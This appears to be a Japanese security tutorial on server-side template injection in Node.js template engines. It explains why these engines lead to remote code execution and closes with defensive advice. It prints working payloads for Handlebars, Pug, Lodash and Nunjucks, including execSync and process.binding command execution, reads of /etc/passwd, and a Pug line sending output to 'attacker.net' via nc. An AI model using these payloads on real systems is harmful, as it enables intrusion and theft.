## JavaScript系SSTIとエンジン別チートシート

Node.jsのサーバーサイドテンプレートエンジン(Handlebars、Pug、EJS、Nunjucks、Lodashなど)は、Java系(Jinja2/FreeMarker/Velocity)ほど「サンドボックス」を強く意識した設計になっていないものが多く、テンプレート内で任意のJavaScript式を評価できてしまうと、そのままNode.jsの標準モジュール(`child_process`など)に到達しやすいという特徴があります。本節では、代表的なJS系テンプレートエンジンのSSTI(Server-Side Template Injection: サーバー側でテンプレートをレンダリングする際に、本来はデータであるべきユーザー入力がテンプレート構文として解釈・評価されてしまう脆弱性)ペイロードと、その裏側にある仕組みを整理します。防御目的の解説であり、実在サービスへの無許可の検証手順は扱いません。

### なぜJS系テンプレートエンジンはRCEに直結しやすいのか

Jinja2やFreeMarkerの多くは、テンプレート内で参照できる名前空間(グローバル変数やビルトイン関数の集合)を意図的に制限し、危険なオブジェクトへ到達するには「クラス階層を遡る」といった迂回が必要です。一方でJS系エンジンの多くは次のような設計上の理由からsink(入力が最終的に実行・解釈される危険な代入先)への距離が近くなります。

- **`eval`やFunctionコンストラクタを内部で使ってテンプレートをコンパイルする実装が多い**。テンプレート文字列を一度JavaScriptのコード片に変換してから`new Function(...)`や`eval`で実行するため、コンパイル前の文字列に細工ができれば任意コードの挿入余地が生まれます。
- **Node.jsのグローバルスコープに`process`オブジェクトが常駐しており、`process.mainModule.require`経由で任意のコアモジュール(`child_process`、`fs`など)をロードできる**。ブラウザのJavaScriptと違い、Node.jsは「OSプロセスを操作するための特権的なAPI」が標準で言語ランタイムに組み込まれているため、テンプレートエンジンのサンドボックスが甘いとほぼ即RCE(Remote Code Execution)に到達します。
- **テンプレートの「式(expression)」構文がJavaScriptの構文をほぼそのまま許容する**エンジン(Lodash、Pugのコード実行構文など)がある。これはテンプレートの表現力を高めるための設計判断ですが、攻撃者から見ればサンドボックス脱出そのものが不要、もしくは非常に浅い迂回で済むことを意味します。

以下、各エンジンの具体的な挙動を見ていきます。

### 汎用(ユニバーサル)ペイロード: `process.mainModule.require`

複数のJS系エンジンで共通して使える、いわば「万能鍵」に相当するのが次のペイロードです。

```javascript
global.process.mainModule.require("child_process").execSync("id").toString()
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜ動くのか**: Node.jsではエントリーポイントのモジュールが`process.mainModule`として保持されており、そこには`require`関数が生えています。この`require`はNode.jsのモジュールローダーで、引数に渡した文字列(ここでは`"child_process"`)に対応するコアモジュールをロードして返します。`child_process`モジュールの`execSync`関数はOSのシェルにコマンド文字列をそのまま渡し、同期的に実行して標準出力を返す関数です。つまりこの一行は「Node.jsのグローバル変数からモジュールローダーを取り出し、プロセス生成モジュールを読み込み、そこでシェルコマンドを実行する」という一連の流れを、たった1つのJavaScript式に凝縮したものです。テンプレートエンジンが「任意のJavaScript式を評価してその結果を出力に埋め込む」機能を提供している限り、この式さえテンプレートに注入できればRCEに到達します。

この式は出力の取得方法を変えることで、代表的な4つの検知・悪用パターンに派生します。

```javascript
// Rendered RCE: レンダリング結果に直接コマンド出力が出る場合
global.process.mainModule.require("child_process").execSync("id").toString()

// Error-Based: 出力がそのまま返らない場合、意図的に例外を起こしてエラーメッセージにコマンド出力を混入させる
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]

// Boolean-Based: 真偽値としてしか結果を観測できない場合、コマンドの終了コードを比較して条件分岐を作る
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]

// Time-Based: 出力もエラーも観測できないブラインド環境で、応答時間の差から結果を推測する
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜこの4パターンが必要か**: SSTIの検証・(防御側から見れば)影響評価では、アプリケーションがコマンド実行結果をどこまで攻撃者に「見せて」しまうかによって、使える検知手法が変わります。

- **Rendered(直接出力)**: レンダリング結果がそのままHTTPレスポンスに含まれるなら最も単純で、`execSync`の戻り値(`Buffer`)を`.toString()`で文字列化してテンプレートの出力位置に流し込むだけです。
- **Error-Based**: アプリがエラーメッセージ(スタックトレースなど)をレスポンスに含めてしまう場合、わざと例外を発生させ、その例外オブジェクトの中にコマンド出力を埋め込みます。上の例では存在しないパス`"Y:/A:/"+コマンド出力`を`require`に渡すことで「モジュールが見つからない」という`Error`オブジェクトのメッセージ文字列にコマンド出力が連結される、あるいは文字列に対する不正なプロパティアクセス(`""["x"][...]`)でTypeErrorのメッセージにインデックス値(コマンド出力)が現れる、という性質を利用します。
- **Boolean-Based**: レスポンスの内容やステータスコードが「真/偽」の2値でしか観測できないブラインド状況では、`spawnSync`の戻り値`status`(プロセスの終了コード、成功時は`0`)を条件式で判定し、配列の`length`プロパティへのアクセスの成否(存在しない添字だと`undefined`、存在すれば数値)によってテンプレートエンジン側のエラー有無・出力有無を切り替え、真偽の1ビットを外部から観測可能にします。
- **Time-Based**: 出力もエラーも一切観測できない完全なブラインド状況では、`&& sleep 5`をコマンドに連結して応答時間を意図的に遅延させ、レスポンスタイムの差(遅延の有無)だけで条件やコマンド実行の成否を1ビットずつ読み出します。これはSQLi(SQLインジェクション)のタイムベースブラインド手法と同じ発想で、「観測できる唯一のチャネルが時間差だけ」という状況に対応する最後の手段です。

これらのバリエーションは、後述する各エンジン固有のペイロードのテンプレート構文の中に、この`process.mainModule.require(...)`という核となる式を差し込む形で組み合わせて使います。

### Handlebarsの場合: サンドボックスをconstructorチェーンで迂回する

Handlebarsは`{{ }}`構文を使うテンプレートエンジンで、通常はコンテキストオブジェクトのプロパティ参照や登録済みヘルパー呼び出ししかできず、任意のJavaScriptオブジェクトへ自由にアクセスすることはできません。しかし、`GHSA-q42p-pg8m-cqh6`として報告された脆弱性(影響バージョン: `< 3.0.7`、`>= 4.0.0` かつ `< 4.0.14`、`>= 4.1.0` かつ `< 4.1.2`。修正は各系列の後継バージョンで行われています)では、`#with`ブロックヘルパーのネストと文字列オブジェクトの`constructor`プロパティを組み合わせることで、テンプレートのコンテキストから任意のコンストラクタ関数へたどり着けてしまいます。

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**仕組みの分解**: このペイロードは一見難読化されているように見えますが、行っていることは次の3ステップです。

1. **文字列プリミティブから`constructor`(コンストラクタ関数、そのオブジェクトを生み出した「型」を表す関数)を取り出す**。JavaScriptでは文字列リテラルもオブジェクトのようにプロパティアクセスができ、`"s".constructor`は`String`関数そのものを返します。`{{#with "s" as |string|}}`でこの文字列をコンテキストに束縛し、`lookup string.sub "constructor"`(`sub`は文字列のスライスメソッドの一種で、ここでは実質的にオブジェクトとしての文字列を経由するための踏み台)でconstructorへの参照を得ます。
2. **`Function`コンストラクタに到達する**。JavaScriptでは関数オブジェクトの`constructor`は`Function`であり、任意の文字列をJavaScriptコードとしてコンパイルして実行できる`new Function(codeString)`と等価な操作が可能になります。上記の`{{this.push (lookup string.sub "constructor")}}`のような一連の配列push/pop操作は、Handlebars側の式評価の制約(直接`new Function(...)`のような呼び出し構文が書けない)を回避しつつ、配列を経由してこの`constructor`を後段の`apply`呼び出しの対象にするためのテクニックです。
3. **生成した関数に攻撃者のコード文字列を注入して呼び出す**。`this.push "return require('child_process').execSync('ls -la');"`で、実行させたいJavaScriptコード(ここでは`child_process`をrequireしてコマンドを実行し、その戻り値をreturnする関数本体)を配列に積み、`string.sub.apply(0, codelist)`という形で「配列の要素を引数リストとして関数を呼び出す」`Function.prototype.apply`の挙動を使って、事実上`Function("return require('child_process').execSync('ls -la');")()`を実行させます。

このように、Handlebars自体は`eval`のような危険な関数を直接テンプレート内に公開していませんが、**JavaScriptの言語仕様上どのオブジェクトからも辿れる`constructor`チェーン**(文字列→String→Function)を悪用することで、事実上の`eval`相当の能力に到達できてしまいます。これは「サンドボックス」という概念が、個々の危険な関数を隠すだけでは不十分で、言語のプロトタイプチェーン全体を遮断しない限り破られ得ることを示す典型例です。修正版のHandlebarsでは、この種のコンストラクタ経由のプロトタイプチェーン到達を制限する対策が施されています。

### Pugの場合: テンプレート内での生JavaScript実行

Pug(旧Jade)は、行頭に`-`をつけることでテンプレート内に生のJavaScript文をそのまま埋め込める設計になっています。これはHandlebarsのような「制約付きの式評価」ではなく、そもそも言語機能として素のコード実行を許しているため、インジェクションが成立すれば迂回なしで即座にコード実行に至ります。

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

もしくは1行にまとめた式ベースの表現として、次のような形も使われます。

```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜ動くのか**: Pugのコンパイラはテンプレートをレンダリング関数(JavaScriptのソースコード)にコンパイルする際、`-`で始まる行を「バッファリングされないコード(unbuffered code)」としてそのままコンパイル後のJavaScriptに埋め込みます。つまりPugにおける`-`行や`#{}`/`=`式は、テンプレート言語の枠内に収まらず、事実上「そのままJavaScriptとして実行される領域」です。ここに攻撃者が制御できる文字列がテンプレートのソースとして渡ってしまう(例えば、ユーザー入力をテンプレート文字列として`pug.render(userInput)`のように直接コンパイルしてしまう実装)と、サンドボックスを迂回する必要すらなく、`root.process`(テンプレートのローカル変数として渡されるグローバルコンテキスト、または`process`グローバルへの参照)経由でNode.jsのAPIに直接手が届きます。`spawnSync`は`execSync`と似ていますが、コマンドと引数配列を分離して渡せるため、シェルのメタ文字解釈を避けつつプロセスを起動できる点が異なります(ただし`shell: true`オプションを渡した場合はシェル経由になり、通常のコマンドインジェクションと同様の注意が必要です)。

### Lodashの場合: テンプレートオプションの設定ミスと`process.binding`

Lodashの`_.template()`は本来「ユーティリティ関数」であり、テンプレートエンジンとして使うことを主目的とはしていませんが、実務では簡易テンプレートとして利用されることがあります。

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜここが危険なsinkになるのか**: `options.evaluate`は「JavaScriptとしてそのまま評価される部分」を示す正規表現です。つまり開発者が`evaluate`オプションの対象範囲(通常は`{{ }}`のような区切り)を自前で設定した時点で、その区切りの中身は`interpolate`(値を安全に出力側へ埋め込む用途)とは異なり、**任意のJavaScript文として実行される**ことが設計上の前提になります。もしこの`evaluate`の対象文字列にユーザー入力がそのまま流れ込む実装になっていれば、`{{ ここに攻撃者の入力 }}`という形でコードインジェクションが成立します。これはテンプレートエンジン自体の脆弱性というより、「評価対象」と「出力対象」を分けるという設計意図を開発者が誤用してしまう、設定起因のSSTIの典型例です。

Command Executionの実例として次のペイロードが挙げられます。

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**仕組み**: このペイロードは`child_process`モジュールを介さず、Node.jsの内部バインディング`process.binding("spawn_sync")`を直接呼び出してプロセスを生成しています。`process.binding`はNode.jsのC++実装(ネイティブアドオン)へ直接アクセスするための低レベルAPIで、`child_process`モジュールはこの内部APIをラップして使いやすくした「表向きの」インターフェースにすぎません。ペイロードは`Object`から新しいオブジェクト`a`(`w`とエイリアス)を生成し、パイプ用のファイルディスクリプタ構成(`type: "pipe"`、`readable`/`writable`フラグ)、実行ファイル(`/bin/sh`)、引数配列、標準入出力の割り当て(`stdio`)を手動で組み立てたうえで、`spawn_sync`バインディングの`spawn()`に渡しています。`require('child_process')`が使えない、あるいは`require`自体がフィルタされている場合でも、`process`グローバルとその`binding`メソッドさえ生きていれば、より低レイヤーのAPIから同じ結果(コマンド実行)に到達できることを示す例です。防御側としては「`require`や`child_process`という文字列だけを禁止する」フィルタが、`process.binding`のような迂回経路に対して無力であることの根拠になります。

### EJS・Nunjucksについての補足

> ⚠️ **未取得の資料**: 今回参照した一次情報(PayloadsAllTheThings JavaScript.md)には、EJSおよびNunjucks固有の独立したペイロードセクションは含まれておらず、冒頭のエンジン一覧表(区切り文字が`EJS: <% %>`、`NunjucksJS: {{ }}`)にとどまり、専用のコード例は取得できませんでした。詳細な最新ペイロードは元ページを直接ご参照ください: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

（以下は未取得資料の補足として一般知識に基づく解説です）EJSは`<% %>`(スクリプトレット、任意文実行)と`<%= %>`(値の出力、HTMLエスケープなし)、`<%- %>`(値の出力、生HTML)という複数の区切りを持ちます。EJSの`<% %>`はPugの`-`行と同様に「テンプレートコンパイル後のJavaScriptにそのまま埋め込まれる生コード領域」であるため、ここにユーザー入力が到達すれば前述の`process.mainModule.require`ペイロードがそのまま使えます。Nunjucksは元々Jinja2の設計思想をJavaScriptに移植したエンジンで、`{{ }}`は式の出力用ですが、Nunjucksは独自のフィルタ機構やグローバル関数を通じてサンドボックスの薄さが問題になることがあり、`{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`のように、配列生成関数`range`の`constructor`(=`Function`)を経由してコードを実行させる、Handlebarsと同種の「constructorチェーン」パターンが知られています。いずれのケースも、根底にあるのは前述した「JavaScriptのどのオブジェクトからもプロトタイプチェーンを遡って`Function`コンストラクタに到達できる」という言語仕様レベルの共通問題です。

### エンジン別テンプレート区切り文字チートシート

検知・トリアージの第一歩は、対象がどのテンプレートエンジンかを見分けることです。以下はテンプレート区切り文字の一覧で、レスポンスに`{{7*7}}`等を送って挙動を観察する際の手がかりになります。

| テンプレートエンジン | 区切り文字(delimiter) |
|---|---|
| DotJS | `{{= }}` |
| DustJS | `{ }` |
| EJS | `<% %>` |
| Handlebars | `{{ }}` |
| HoganJS | `{{ }}` |
| Lodash | `{{= }}` |
| MustacheJS | `{{ }}` |
| NunjucksJS | `{{ }}` |
| PugJS | `#{ }` |
| TwigJS(JS移植版) | `{{ }}` |
| UnderscoreJS | `<% %>` |
| VelocityJS | `#=set($X="")$X` |
| VueJS | `{{ }}` |

> 出典: PayloadsAllTheThings: SSTI JavaScript(Handlebars/Pug/EJS/Nunjucks) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

**なぜ区切り文字の一致だけでは確定診断にならないか**: `{{ }}`という区切り文字はHandlebars、HoganJS、MustacheJS、NunjucksJS、VueJSなど複数のエンジンで共有されているため、区切り文字が一致しても対象エンジンを一意に特定することはできません。実務のトリアージでは、区切り文字による一次スクリーニングの後、各エンジン固有の関数名(`range`があればNunjucks、`#with`ブロックヘルパーが効けばHandlebars、といった具合)や、エラーメッセージに出るスタックトレースの文言(`Handlebars: ...`、`Pug:...`など)、レスポンスヘッダやフレームワークの典型的な組み合わせ(例: Expressアプリで`res.render`を使っていればビューエンジンの設定からある程度絞り込める)を併用して、候補を段階的に絞り込む必要があります。

### 参考: 汎用SSTI検知手法との比較(補足)

Payloadplaygroundのチートシートは、Jinja2/Twig/FreeMarker/ERB/Velocity/Thymeleaf/SpEL/Pebbleといった主にPython・Java・Ruby系のテンプレートエンジンを対象とした検知式・差分テストの一覧を提供しており、今回のJavaScript系エンジンの記載は含まれていませんでした。ただし、そこで採用されている**方法論**(`{{7*7}}`のような数値演算の埋め込みでSSTIかどうかを検知し、`{{7*'7'}}`のような型混在の演算で出力差分(例: Jinja2は文字列反復で`7777777`、Twigは型変換して`49`)からエンジンを絞り込むという段階的差分テスト)は、言語やエンジンを問わず応用できる普遍的な考え方です。JS系エンジンのトリアージでも、まず無害な演算式(`{{7*7}}`相当)でテンプレート評価が起きるかを確認し、次に区切り文字やエラーメッセージの差異でエンジンを絞り込み、最後に該当エンジン固有のペイロードを試す、という同じ3段階のアプローチが有効です。

> 出典: Payloadplayground: SSTI cheatsheet(エンジン別テスト式一覧) — https://payloadplayground.com/cheatsheets/ssti

### 防御側の要点まとめ

- **テンプレート文字列にユーザー入力を直接渡さない**。テンプレートは事前に固定されたファイルとして用意し、ユーザー入力は変数(コンテキストデータ)としてのみ渡す設計にします。`pug.render(userInput)`や`_.template(userInput)`のように、テンプレートの「構造」自体をユーザー入力から組み立てる実装は避けるべきです。
- **信頼できないテンプレート文字列を扱う場合は、サンドボックス化された実行環境(別プロセス、権限を絞ったVMコンテキストなど)を使う**。Node.jsの`vm`モジュールによる分離も万能ではなく、既知のプロトタイプチェーン経由の脱出手法が存在するため、OSレベルのプロセス分離やコンテナ分離と組み合わせるのが望ましい防御です。
- **依存ライブラリのバージョンを追跡する**。Handlebarsの`GHSA-q42p-pg8m-cqh6`のように、テンプレートエンジン自体の脆弱性は修正版がリリースされているため、古いバージョンを使い続けないことが基本的だが重要な対策です。
- **`require`や`child_process`という文字列だけをブロックするフィルタは不十分**。`process.binding`のような低レベルAPI経由の迂回や、`constructor`チェーンを介した間接的な到達経路があるため、文字列ブラックリスト方式のWAF的対策は根本的な解決になりません。入力のサニタイズよりも、そもそもテンプレートの評価対象にユーザー入力を含めない設計上の分離が最も効果的です。
